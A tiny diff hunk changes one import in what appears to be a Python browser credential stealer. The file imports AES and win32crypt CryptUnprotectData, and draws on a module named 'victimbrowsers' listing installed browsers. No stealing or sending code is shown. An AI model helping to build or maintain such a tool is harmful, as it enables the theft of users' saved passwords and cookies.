@@ -6,7 +6,7 @@ import json
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from datetime import datetime, timedelta
-from victimbrowsers import navegadores_instalados  
+from .victimbrowsers import navegadores_instalados  
 
 
 
